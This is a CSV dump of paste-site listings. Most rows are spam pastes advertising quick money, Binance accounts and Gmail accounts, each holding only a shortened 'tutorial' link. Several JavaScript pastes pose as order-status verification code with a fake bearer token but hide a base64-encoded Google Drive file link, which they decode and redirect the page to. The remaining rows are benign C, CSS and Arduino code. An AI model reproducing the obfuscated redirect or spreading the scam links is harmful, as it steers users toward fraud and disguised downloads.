id,title,username,language,date,content
8hFrtF8Q,EARN $900 INSTANTLY 2025 9A,nielshacket,JavaScript,Monday 24th of March 2025 06:47:04 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

wuKD9dEgzs
"
dmwx6YMH,Random Gmail Acc C2,nielshacket,JavaScript,Monday 24th of March 2025 06:44:56 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

vJ3wMU4gbZ
"
yFeKJPuF,Make $1000 15-MINUTES (BEGINNER) 2A,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:42:11 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

u3Zp2jLKzu
"
267yXfaq,Binance account 0N,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:40:03 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

S0aHJrMMtW
"
tS4AiLAL,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:38:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0q26t1Bz,EARN $900 INSTANTLY 2025 9A,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:37:57 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

xlQub4om21
"
e6FChb8i,Random Gmail Acc C2,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:35:53 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

iSmVXQbrXZ
"
8wa5GesX,Make $1000 15-MINUTES (BEGINNER) 2A,LavenderInk,JavaScript,Monday 24th of March 2025 06:33:31 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

1PxZ6wC03q
"
a7gHWhmq,Binance account 0N,LavenderInk,JavaScript,Monday 24th of March 2025 06:31:26 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

5GMwaFznaQ
"
2rn85py3,EARN $900 INSTANTLY 2025 9A,LavenderInk,JavaScript,Monday 24th of March 2025 06:29:16 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

B8X3Zs6X56
"
FU0UPAkK,Random Gmail Acc C2,LavenderInk,JavaScript,Monday 24th of March 2025 06:27:06 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

IODnJ5nt0v
"
TKVACyEz,Make $1000 15-MINUTES (BEGINNER) 2A,LavenderInk,JavaScript,Monday 24th of March 2025 06:25:01 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

t82NR8S8QR
"
8g5TGNpW,Untitled,dllbridge,C,Monday 24th of March 2025 06:24:37 AM CDT,"

#include <stdio.h>

int  main()
{
	int v = 0, b = 0, nRes = 0;
		printf(""Enter  number"");
	scanf(""%d"", &b);
	printf(""Enter  number"");
	scanf(""%d"", &v);
	
	nRes = (v >b) ? v : b;  // Придумать два примера с этим оператором
	
	printf(""%d"", nRes);

}

















/*
#include   <stdio.h>
#include  <locale.h>   


/////////////////////////////////////////////////
void printBinary(int num)                      //  
{
    
    int numBits = 32;


    for (int i = numBits - 1; i >= 0; i--)     // Перебираем все биты, начиная со старшего
	{
    
        if(num & (1 << i))  printf(""1"");       // Проверяем, установлен ли текущий бит
	    else                printf(""0"");
        
        if(i % 8 == 0)      printf("" "");       // Добавляем пробел для удобства чтения (например, каждые 8 бит)
        
    }
    printf(""\n"");
}


///////////////////////////////////////////////
int main()                                   //
{
	
	setlocale(LC_ALL, ""rus"");
	
	
    int num = 42; 
    
	printf(""Десятичное число: %d\n"", num);
    printf(""Двоичное представление: "");
    
	printBinary(num);

return 0;
}

*/
"
zK9fHBgC,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:23:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/002/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eX90vFSj,Binance account 0N,LavenderInk,JavaScript,Monday 24th of March 2025 06:22:57 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

cA3VqsuKH4
"
6uXAvDzG,EARN $900 INSTANTLY 2025 9A,add12q,JavaScript,Monday 24th of March 2025 06:20:24 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

6R3ow9kpwY
"
3Rsm6byB,Random Gmail Acc C2,add12q,JavaScript,Monday 24th of March 2025 06:18:19 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

GQwuYYNFez
"
yfcejQjA,Make $1000 15-MINUTES (BEGINNER) 2A,add12q,JavaScript,Monday 24th of March 2025 06:16:14 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

l6ympx9gY4
"
4qzt4zq4,Binance account 0N,add12q,JavaScript,Monday 24th of March 2025 06:14:01 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

LUHTg7YzDm
"
cjb4GtMk,EARN $900 INSTANTLY 2025 9A,add12q,JavaScript,Monday 24th of March 2025 06:11:56 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

EQCjRMJcEd
"
3w5bVkcM,Random Gmail Acc C2,add12q,JavaScript,Monday 24th of March 2025 06:09:52 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

ZeqhkcyKzJ
"
5PCa3EUP,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:07:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/674/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Vm3tnr6N,CHICSS,Turgen,CSS,Monday 24th of March 2025 05:58:14 AM CDT,"#game
  {
    background:#00110e;
	background-size: cover;
	font-family: DejaVu Sans Mono, monospace;
	letter-spacing: 1px;
	font-stretch: ultra-expanded
    color:#ffc000;
  }


.box
{
	text-align:left;
	padding: 0px;
	box-shadow:none;
}
#box-res.fullWidth
{
	text-align:center;
	width:100%;
	top:0%;
	height:5%;
	min-height:32px;
	z-index:100;
	position:absolute;
	color:#ffc000 !important;
}
.box-header,.box-footer,.box-bit
{
	background:#ffc000;
	color:#00110e;
	
}

.box-header{
	font-size: 20px;
  	font-style: italic;
	font-weight: 1000;
	text-align: start;
	padding-left: 20px;
}
.box-bit{border-radius:0px;}

.box-header
{
	border-bottom-left-radius:0px;
	border-bottom-right-radius:0px;
	margin-bottom:0px;
}
.box-footer
{
	border-top-left-radius:0px;
	border-top-right-radius:0px;
	margin-top:4px;
}


#box-main
{
	left:0px;
	top:0px;
	bottom:0px;
	overflow:hidden;
	width:19%;
	position:absolute;
margin-bottom: 1%;
	margin-left: 1%;
	margin-right: 1%;
}

#box-buttons
{
	top:0px;
	right:0px;
	bottom:0px;
	left:0px;
	position:absolute;
}
#box-store
{
	right:0px;
	top:32px;
	bottom:0px;
	width:80% !important;
	position:absolute;
	margin-bottom: 1%;
	margin-left: 1%;
	margin-right: 1%;
}
#box-buildings,#box-upgrades, #box-buildings2,#box-upgrades2
{
	top:0px;
	bottom:0px;
	width:49%;
	right:0%;
	overflow-x:hidden;
	overflow-y:auto;
	position:absolute;
}
#box-buildings, #box-upgrades2
{right:51%;}

#box-buildings, #box-upgrades
{bottom: 52%;}






.thing
{
	display:inline-block;
	padding:0px;
	margin:0px;
	cursor:pointer;
}
.thing:hover,.thing.lit
{
	background:#ffc000;
}



.upgrade.owned,.achiev.owned
{
	color:#ffc000;
	background:#00000000;
}
.thing-text,.thing-costs{

font-weight:bold;
font-size: 16px;

}

.building
{
	border-top-left-radius:0px;
	border-bottom-left-radius:0px;
	display:block;
	margin-right:0px;
	font-size:14px;
}
.building, .upgrade{
padding-left: 4px;
}


.fullWidth
{
	display:block;
	margin-left:0px;
	margin-right:0px;
	z-index:10;
}
#game .fullWidth
{
	height:auto;
	min-height:auto;
}

.fullWidth:before,.fullWidth:after
{
	content:'';
	height:1px;
	position:absolute;
	left:0px;
	right:0px;
	z-index:-1;
}
.fullWidth:before{top:-1px;}
.fullWidth:after{bottom:-1px;}

.fullWidth .thing-icon
{
	margin-top:0px;
	margin-bottom:0px;
}
.fullWidth .thing-text
{
	margin-top:0px;
	margin-bottom:0px;
}



#box-buildingsHeader{
top: 0px;
width:49%;
left: 0%;
position: absolute;
height: 32px;




}

#box-upgradesHeader{
top: 0px;
width:49%;
right: 0%;
position: absolute;
height: 32px;
}

#box-buildings2Header{
top: 51%;
width:49%;
right: 0%;
position: absolute;
height: 32px;




}

#box-upgrades2Header{
top: 51%;
width:49%;
left: 0%;
position: absolute;
height: 32px;
}

#box-logHeader{
opacity: 1;
position: absolute;
top: 51%;
width: 86%;
left: 0px;
height: 32px;
margin-left: 2%;
margin-right: 2%;
}


#box-buildingsHeader:before, #box-upgradesHeader:before, #box-buildings2Header:before, #box-upgrades2Header:before, #box-logHeader:before{

height: 10px;


	content: '';
    position: absolute;
    top: 0; left: 0;
    border-top: 16px solid #00110e;
    border-right: 16px solid #ffc000;
    width: 0;
}






#box-buildings, #box-upgrades{
top: 32px;
border: thick solid #ffc000;
color:#ffc000;
}

#box-buildings2, #box-upgrades2{

top: 51%;
margin-top: 32px;
border: thick solid #ffc000;
color:#ffc000;
}

.building:hover, .upgrade:hover{
transition: 0.2s;
color: #00110e;
background: #ffc000;

}

.building:active, .upgrade:active{
transition: 0.3s;
color: #ffc000;
background: #00110e;

}

#bulkDisplay{
position: absolute;
left: 0%;
top: 0px;
}
.upgrade{
width:100%;

}

.thing-text, .thing-costs{

padding: 8px;
text-shadow: 0px 0px 0px #000;

}.box{
text-shadow: 0px 0px 0px #000;

}

#box-log{
position: absolute !important;
opacity: 1 !important;
top: 51%;
margin-top: 32px;
left: 0% !important;
bottom: 0%;
width: 86% !important;
background:#00110e;
color:#ffc000;
border: thick solid #ffc000;

	margin-left: 2%;
	margin-right: 2%;
}
#logOuter{
background:#00110e;
color:#ffc000;


}
#logInner{
display: flex;
flex-direction: column;
padding: 5%;
background:#00110e;
color:#ffc000;
overflow:auto;
}
 
#box-things-Buttons{
position: absolute;
height: 50%;
top: 0%;
width: 100%;
}

.wobble {
    animation: wobble 0.5s;
    animation-duration: 0.5s;
    transition: transform 1.00s ease-out;
   
}
 
@keyframes wobble {
0% {
    opacity: 0.7;
    transform: scale(1);
}
5% {
    opacity: 1;
    transform: scale(0.9);
}
100%
    opacity: 1;
    transform: scale(1);
}
}
::-webkit-scrollbar{
width: 0.5vw !important;

}
#log::-webkit-scrollbar, #box-upgrades::-webkit-scrollbar, #box-buildings::-webkit-scrollbar, #box-upgrades2::-webkit-scrollbar, #box-buildings2::-webkit-scrollbar {
    width: 0.5vw !important;
}
#log::-webkit-scrollbar-thumb, #box-upgrades::-webkit-scrollbar-thumb, #box-buildings::-webkit-scrollbar-thumb, #box-upgrades2::-webkit-scrollbar-thumb, #box-buildings2::-webkit-scrollbar-thumb {
   background: #ffc00099 !important;
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}
#log::-webkit-scrollbar-thumb:hover, #box-upgrades::-webkit-scrollbar-thumb:hover, #box-buildings::-webkit-scrollbar-thumb:hover, #box-upgrades2::-webkit-scrollbar-thumb:hover, #box-buildings2::-webkit-scrollbar-thumb:hover {
   background: #ffc000 !important;
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}

#log::-webkit-scrollbar-track, #box-upgrades::-webkit-scrollbar-track, #box-buildings::-webkit-scrollbar-track, #box-upgrades2::-webkit-scrollbar-track, #box-buildings2::-webkit-scrollbar-track {
   background: #00110e !important;
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
  
}

.thing.bigButton{
position: absolute !important;
margin-left: -100%;
margin-top: -30%;
margin-right: 10%;

position: absolute;
width: 10vw;
height: 10vw;
top: 28vh;
left: 23vw;
}

.thing.bigButton .thing-icon{


background-size: contain !important;
}

.popup, #tooltip, .toast {
    background: #00110e;
    color: #ffc000 ;
    border-radius: 0px;
    box-sizing: border-box;
    padding: 8px 8px;
 	border: thick solid #ffc000;
	box-shadow: none !important;
	text-shadow: none !important;

font-weight:bold;
}

 
#tooltipContent{
color: #ffc000;
font-weight: 100;
 
font-weight:bold;
}

#tooltip .desc, .listing.b, .listing b, .desc b{

color: #ffc000;

}
#tooltip .thing-icon{

}.tooltipPoint{
border: 0px !important;
box-shadow: none !important;
text-shadow: none !important;
color: #ffc000;
visibility: hidden;
}
#box-things-sortup, #box-things-sortup2, #box-things-Upgrades, #box-things-upgrades2  /*if necessary, change this to the name of the box containing your upgrades. it should start with ""box-things"" and you can use inspect element to find it*/
{
    display:flex;
    flex-wrap:wrap;
    justify-content:center; /*you can change this to ""flex-start"" if you want upgrades aligned to the left*/
	flex-direction: column-reverse;
}

#box-things-Buildings, #box-things-buildings2{
	display:flex;
    flex-wrap:wrap;
    justify-content:center; /*you can change this to ""flex-start"" if you want upgrades aligned to the left*/
	flex-direction: column-reverse;
}

.tag-sortup, .tag-sortup2, .building, .upgrade2.notOwned, .upgrade2.cantAfford{
    order:3;
}
.upgrade.notOwned {
    order:3;
}
.upgrade.owned, .upgrade2.owned
{
    order:1;
}
.achiev:hover{
margin-right: -1px;
border: 1px solid #ffc000;
color: #00110e;
background: #ffc000;

}.achiev{
margin-right: -1px;
border: 1px solid #ffc000;
color: #ffc000;
background: #00110e;

}

.systemButton{
    cursor: pointer;
    display: inline-block;
    font-weight: bold;
    background: #00110e;
    box-shadow: none;
    padding: 4px 6px;
    margin: 2px;
    position: relative;
border: 1px solid #ffc00099;
}
.systemButton:hover {
    
    background: #00110e;
    
border: 1px solid #ffc000;
}

.tickbox.on:before {
    background: #ffc000;
	box-shadow: none;
}

.tickbox, .footerTitle{
color: #ffc000;
}

.tickbox:before{
background: #00110e;
}
"
Fx9Qjn7a,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:51:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/082/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7SGRZZc0,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:36:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/235/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tWRKHE29,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:21:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/916/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MMkH9VPV,"""Sequential Control"" rev_02",pleasedontcode,Arduino,Monday 24th of March 2025 05:19:45 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Sequential Control""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-03-24 10:18:26

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* make it work */
/****** SYSTEM REQUIREMENT 2 *****/
	/* doesnt count */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Servo.h>	//https://github.com/arduino-libraries/Servo

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button_PushButton_PIN_D2		= 2; // This is the pin for the button

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo servo1; 
Servo servo2;
Servo servo3;
Servo servo4;
Servo servo5;
Servo servo6;
Servo servo7;

void setup(void)
{
	// put your setup code here, to run once:
	pinMode(button_PushButton_PIN_D2, INPUT_PULLUP); // Using INPUT_PULLUP for button

	// Attach servos to their respective pins
	servo1.attach(11);
	servo2.attach(10);
	servo3.attach(3);
	servo4.attach(4);
	servo5.attach(5);
	servo6.attach(6);
	servo7.attach(7);

	// Initialize servos to a starting position
	servo1.write(180);
	servo2.write(180);
	servo3.write(180);
	servo4.write(180);
	servo5.write(180);
	servo6.write(180);
	servo7.write(180);
}

static int buttoncount = 0; // Moved outside of loop for global access

void loop(void)
{
	// put your main code here, to run repeatedly:
	int button = digitalRead(button_PushButton_PIN_D2); // Read the button state

	if (button == HIGH) {
		buttoncount += 1;
		if (buttoncount == 1) {
			servo1.write(180);
			servo2.write(180);
			servo3.write(180);
			servo5.write(180);
			servo6.write(180);
		}
		if (buttoncount == 2) {
			servo4.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo3.write(90);
			servo2.write(90);
			servo6.write(180);
		}
		if (buttoncount == 3) {
			servo3.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
		}
		if (buttoncount == 4) {
			servo6.write(90);
			servo5.write(90);
			servo7.write(90);
			servo4.write(90);
			servo1.write(180);
			servo2.write(180);
		}
		if (buttoncount == 5) {
			servo1.write(90);
			servo6.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
			servo7.write(180);
		}
		if (buttoncount == 6) {
			servo3.write(90);
		}
		if (buttoncount == 7) {
			servo7.write(90);
			servo6.write(180);
			servo5.write(180);
			servo2.write(180);
			servo3.write(180);
		}
		if (buttoncount == 8) {
			servo2.write(90);
			servo3.write(90);
			servo5.write(90);
			servo6.write(90);
		}
		if (buttoncount == 9) {
			servo3.write(180);
		}
		if (buttoncount == 10) {
			servo3.write(90);
			servo5.write(180);
		}
	}
}

/* END CODE */"
